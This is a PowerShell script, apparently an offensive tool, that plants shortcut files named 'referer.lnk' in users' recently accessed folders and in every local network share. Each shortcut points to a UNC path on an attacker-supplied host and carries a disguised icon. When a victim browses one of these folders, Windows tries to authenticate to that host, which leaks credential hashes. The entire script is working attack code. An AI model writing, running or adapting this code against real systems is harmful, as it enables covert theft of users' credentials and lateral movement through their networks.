param (
    [string]$LHOST
)

# Exit if LHOST is not provided
if ([string]::IsNullOrWhiteSpace($LHOST)) {
    return
}

try {
    # Get top 10 recently accessed directories (execute the script block!)
    $recentDirs = & {
        try {
            Get-ChildItem -Path "C:\Users" -Recurse -Directory -ErrorAction SilentlyContinue |
                Where-Object { $_.LastAccessTime -ne $null } |
                Sort-Object LastAccessTime -Descending |
                Select-Object -First 10 -Property FullName
        } catch {
            Write-Error "Failed to retrieve directories: $_"
            @()
        }
    }

    # Create a shortcut in each recently accessed directory
    foreach ($dir in $recentDirs) {
        try {
            $objShell = New-Object -ComObject WScript.Shell
            $lnkPath  = Join-Path -Path $dir.FullName -ChildPath "referer.lnk"
            $lnk      = $objShell.CreateShortcut($lnkPath)
            $lnk.TargetPath  = "\\$LHOST\share\@referer.png"
            $lnk.WindowStyle = 1
            $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
            $lnk.Save()
        } catch {
            Write-Host "Failed to process directory: $($dir.FullName) — $_"
        }
    }

    # List accessible shares
    try {
        $shares = Get-CimInstance -ClassName Win32_Share |
            Where-Object { $_.Name -notmatch "^\$" } |
            Select-Object Name, Path, Description
    } catch {
        Write-Host "Error retrieving shares"
        $shares = @()
    }

    # Create shortcut in each accessible share
    foreach ($share in $shares) {
        try {
            # Skip shares with no local path
            if (-not $share.Path) { continue }

            $objShell = New-Object -ComObject WScript.Shell
            $lnkPath  = Join-Path -Path $share.Path -ChildPath "referer.lnk"
            $lnk      = $objShell.CreateShortcut($lnkPath)
            $lnk.TargetPath  = "\\$LHOST\share\@referer.png"
            $lnk.WindowStyle = 1
            $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
            $lnk.Save()
        } catch {
            Write-Host "Failed to process share: $($share.Name) — $_"
        }
    }
    
    # Output
    Write-Host "`n--- Top 10 Recently Accessed Directories ---`n"
    $recentDirs | Format-Table -AutoSize

    Write-Host "`n--- Accessible Shares ---`n"
    $shares | Format-Table -AutoSize

} catch {
    Write-Host "General error: $_"
}
